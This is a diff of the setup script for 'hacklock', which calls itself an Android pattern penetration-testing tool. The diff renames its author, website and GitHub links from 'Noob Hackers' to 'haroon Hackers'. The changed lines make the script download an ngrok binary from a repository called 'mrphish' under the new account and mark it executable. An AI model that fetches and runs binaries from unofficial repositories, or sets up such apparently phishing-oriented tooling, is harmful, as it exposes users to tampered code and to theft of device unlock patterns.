@@ -3,10 +3,10 @@
 ########### BY NITRO ###########
 #    This Tool Is For Android  #
 #   Pattern Penetraion testing #
-#   web: www.noob-hackers.com  #
+#   web: www.haroon-hackers.com  #
 # You can copy but give credits#
 # Any feedback start issue     #
-######---Noob Hackers----######
+######---haroon Hackers----######
 
 ####### Checks if setup file exists #######
 clear
@@ -19,7 +19,7 @@ clear
 
 ####### Check if update available #######
 check(){
-if wget --spider https://raw.githubusercontent.com/noob-hackers/hacklock/master/update.v1.4 2>/dev/null; then
+if wget --spider https://raw.githubusercontent.com/haroon-hackers/hacklock/master/update.v1.4 2>/dev/null; then
 cd $HOME/hacklock/core/update
 echo "pin" > update.txt
 else
@@ -40,7 +40,7 @@ option
 
 ####### Check patch updates #######
 check1(){
-if wget --spider https://raw.githubusercontent.com/noob-hackers/patchupdateznh/main/hacklockpatch.v.1 2>/dev/null; then
+if wget --spider https://raw.githubusercontent.com/haroon-hackers/patchupdateznh/main/hacklockpatch.v.1 2>/dev/null; then
 cd $HOME/hacklock/core/update
 echo "ttttt" > patch.txt
 else
@@ -148,7 +148,7 @@ printf "\e[1;92m  _|    _|    _|_|_|    _|_|_|  _|    _|  _|_|_|_|    _|_|      
 printf "\n"
 printf "                  \e[104m\e[1;77m  >>  Script By N17R0 << \e[0m\n"
 printf "\n"
-printf "           \e[100m\e[1;77m >>  Youtube Channel : \e[1;96m Noob Hackers \e[100m\e[1;77m << \e[0m\n"
+printf "           \e[100m\e[1;77m >>  Youtube Channel : \e[1;96m haroon Hackers \e[100m\e[1;77m << \e[0m\n"
 printf "\n"
 }
 
@@ -178,7 +178,7 @@ echo " "
 else
 cd $HOME/hacklock
 printf "\e[1;92m[\e[0m*\e[1;92m] Downloading Ngrok...\n"
-wget -O ngrok https://github.com/noob-hackers/mrphish/raw/master/core/ngrok > /dev/null 2>&1
+wget -O ngrok https://github.com/haroon-hackers/mrphish/raw/master/core/ngrok > /dev/null 2>&1
 sleep 20
 if [[ -e "$HOME/hacklock/ngrok" ]]; then
 chmod +x ngrok
@@ -221,7 +221,7 @@ clear
 cd $HOME
 ls -a >/dev/null 2>&1
 rm -rf .ngrok2 >/dev/null 2>&1
-printf "\e[1;92m WATCH THIS VIDEO www.noob-hackers.com\e[0m\n"
+printf "\e[1;92m WATCH THIS VIDEO www.haroon-hackers.com\e[0m\n"
 read -p $'\n\e[1;96m[\e[0m\e[1;92m+\e[0m\e[1;96m] NGROK AUTH CODE : \e[0m' name
 ./ngrok authtoken $name >/dev/null 2>&1
 printf "\e[1;92m[\e[0m*\e[1;92m] NGROK FIXED SUCCESSFULLY:\e[0m\e[1;77m %s\e[0m\n"
